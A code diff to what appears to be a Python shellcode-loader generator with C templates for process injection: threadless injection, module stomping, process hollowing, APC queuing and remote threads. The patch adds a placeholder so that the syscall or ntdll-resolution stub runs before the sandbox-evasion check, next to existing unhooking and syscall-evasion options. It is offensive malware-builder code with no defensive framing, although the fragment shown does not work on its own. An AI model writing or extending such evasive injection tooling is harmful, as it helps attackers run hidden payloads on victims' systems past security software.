@@ -952,6 +952,7 @@ threadless_inject_nocreate_stub = """
 # Majority of code from 0xLegacyy, modified for our needs: https://github.com/iilegacyyii/ThreadlessInject-BOF
 threadless_inject_stub = """
 
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
     REPLACE_ME_SANDBOX_CALL
     REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
@@ -1089,6 +1090,7 @@ module_stomping_stub = """
     CHAR remoteModuleName[128] = {};
     HMODULE remoteModule = NULL;
 
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
     REPLACE_ME_SANDBOX_CALL
     REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
@@ -1236,6 +1238,7 @@ module_stomping_stub = """
 """
 
 process_hollow_stub = """
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
     REPLACE_ME_SANDBOX_CALL
     REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
@@ -1374,6 +1377,7 @@ process_hollow_stub = """
 """
 
 CurrentThread_stub = """
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
     REPLACE_ME_SANDBOX_CALL
 
     HANDLE hProc = GetCurrentProcess();
@@ -1451,6 +1455,7 @@ CurrentThread_stub = """
 """
 
 EnumDisplayMonitors_stub = """
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
     REPLACE_ME_SANDBOX_CALL
 
     HANDLE hProc = GetCurrentProcess();
@@ -1503,6 +1508,7 @@ QueueUserAPC_stub = """
     SIZE_T bytesWritten;
     SIZE_T pnew = payload_len;
 
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
     REPLACE_ME_SANDBOX_CALL
     REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
@@ -1589,6 +1595,7 @@ RemoteThreadSuspended_stub = """
     SIZE_T bytesWritten;
     SIZE_T pnew = payload_len;
 
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
     REPLACE_ME_SANDBOX_CALL
     deC(REPLACE_ME_DECARG);
 
@@ -1696,6 +1703,7 @@ RemoteThreadContext_stub = """
     SIZE_T bytesWritten;
     SIZE_T pnew = payload_len;
 
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
     REPLACE_ME_SANDBOX_CALL
     REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
@@ -2130,12 +2138,22 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         print("[+] Using GetSyscallStub for syscalls")
         stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#pragma comment(lib, "ntdll")')
         stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P1", GetSyscallStubP1)
-        stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", GetSyscallStubP2)
+        if sandbox == "sleep" or sandbox == "dll":
+            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", GetSyscallStubP2)
+            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", "")
+        else:
+            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", "")
+            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", GetSyscallStubP2)
     elif syscall_arg == "none":
         print("[+] Direct syscalls have been disabled, getting API funcs from ntdll in memory!")
         stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#pragma comment(lib, "ntdll")')
         stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P1", NoSyscall_StubP1)
-        stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", NoSyscall_StubP2)
+        if sandbox == "sleep" or sandbox == "dll":
+            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", NoSyscall_StubP2)
+            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", "")
+        else:
+            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", "")
+            stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", NoSyscall_StubP2)
     else:
         if syscall_arg == "syswhispers2":
             print("[+] Using SysWhispers2 for syscalls")
@@ -2144,6 +2162,7 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
             print("[+] Using SysWhispers3 for syscalls")
             syscallFileName = "SW3Syscalls.h"
         stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#include "Syscalls2.h"')
+        stub = stub.replace("REPLACE_ME_SYSCALL_STUB_B4_SANDBOX", "")
         stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P1", "")
         stub = stub.replace("REPLACE_ME_SYSCALL_STUB_P2", "")
         print("[+] Re-hashing API syscalls")
